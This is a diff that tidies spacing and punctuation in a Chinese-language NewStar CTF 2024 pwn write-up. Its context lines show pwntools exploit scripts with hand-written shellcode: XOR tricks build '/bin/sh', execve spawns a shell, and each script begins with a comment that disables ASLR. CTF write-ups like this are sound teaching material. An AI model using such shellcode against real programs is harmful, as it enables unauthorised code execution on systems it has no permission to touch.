@@ -14,7 +14,7 @@ titleTemplate: ':title | WriteUp - NewStar CTF 2024'
 
 可以用异或先把 syscall 的机器码插入到当前 shellcode 的后面来执行 `read` 的 syscall，利用 `read` 在旧的 shellcode 后面插入 `execve("/bin/sh", 0, 0)` 的 shellcode，第二次输入的 payload 中 `0x42` 个 `a` 的作用是覆盖掉旧的 shellcode，毕竟执行过了也没用了。
 
-恢复 `rsp` 的作用是为了能够正常执行 `push` `pop` 指令，这里 `push` `pop` 指令位于 `shellcraft.sh()` 生成的 shellcode中 。否则其生成的 shellcode 无法正常执行。
+恢复 `rsp` 的作用是为了能够正常执行 `push` `pop` 指令，这里 `push` `pop` 指令位于 `shellcraft.sh()` 生成的 shellcode 中 。否则其生成的 shellcode 无法正常执行。
 
 ```python
 # sudo sysctl -w kernel.randomize_va_space=0
@@ -71,7 +71,7 @@ mov byte ptr [r8 + 0x18], 0x5
 ```python
 # sudo sysctl -w kernel.randomize_va_space=0
 from pwn import *
-from Crypto.Util.number import long_to_bytes,bytes_to_long
+from Crypto.Util.number import long_to_bytes, bytes_to_long
 
 context.log_level='debug'
 context(arch='amd64', os='linux')
@@ -90,7 +90,7 @@ add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop�
 mov rsi, 0x4028636f2e49226f
 mov rdx, 0x4040104040204040
 xor rsi, rdx
-push rsi       ; //异或搓出来'/bin/sh\x00'(正好 8 字节，一个寄存器能存下) 并p ush 到栈上面。此时 rsp 指向的即此字符串的开始位置
+push rsi       ; // 异或搓出来'/bin/sh\x00'(正好 8 字节，一个寄存器能存下) 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置
 
 mov ax, 0x454f
 xor ax, 0x4040
@@ -108,12 +108,12 @@ p.sendafter("Input your Code :", asm(shellcode).ljust(0x40, b'\x90'))
 p.interactive()
 ```
 
-除此之外，由于我们把栈放在可执行段上面了，我们可以直接异或整出来syscall的机器码然后push到栈上面，最后jmp rsp即可。由于这种方法我们并不依赖nop指令进行连接，在送payload的时候可以去掉ljust了
+除此之外，由于我们把栈放在可执行段上面了，我们可以直接异或整出来 syscall 的机器码然后 push 到栈上面，最后 `jmp rsp` 即可。由于这种方法我们并不依赖 `nop` 指令进行连接，在送 Payload 的时候可以去掉 `ljust` 了。
 
 ```python
 # sudo sysctl -w kernel.randomize_va_space=0
 from pwn import *
-from Crypto.Util.number import long_to_bytes,bytes_to_long
+from Crypto.Util.number import long_to_bytes, bytes_to_long
 
 context.log_level='debug'
 context(arch='amd64', os='linux')
@@ -132,7 +132,7 @@ add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop
 mov rsi, 0x4028636f2e49226f
 mov rdx, 0x4040104040204040
 xor rsi, rdx
-push rsi       ; //异或搓出来 '/bin/sh\x00' 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置
+push rsi       ; // 异或搓出来 '/bin/sh\x00' 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置
 
 mov rdi, rsp   ; // 设置 rdi，指向之前push到栈上面的 '/bin/sh\x00'
 xor rsi, rsi
@@ -151,9 +151,9 @@ p.sendafter("Input your Code :", asm(shellcode))
 p.interactive()
 ```
 
-在把 `/bin/sh\x00` push 到栈上面的时候我们为了清除最后的 `0x00`，采用了异或的方法。除了这种方法外我们可以调整一下这个字符串，比如我们可以改为使用 `/bin///sh`，`shellcraft.sh()` 生成的 shellcode 采用的就是这种方法。
+在把 `/bin/sh\x00` push 到栈上面的时候，我们为了清除最后的 `0x00`，采用了异或的方法。除了这种方法外我们可以调整一下这个字符串，比如我们可以改为使用 `/bin///sh`，`shellcraft.sh()` 生成的 shellcode 采用的就是这种方法。
 
-按照这种方法更改的 shellcode，也是可以拿到 shell 的
+按照这种方法更改的 shellcode，也是可以拿到 shell 的。
 
 ```python
 shellcode='''
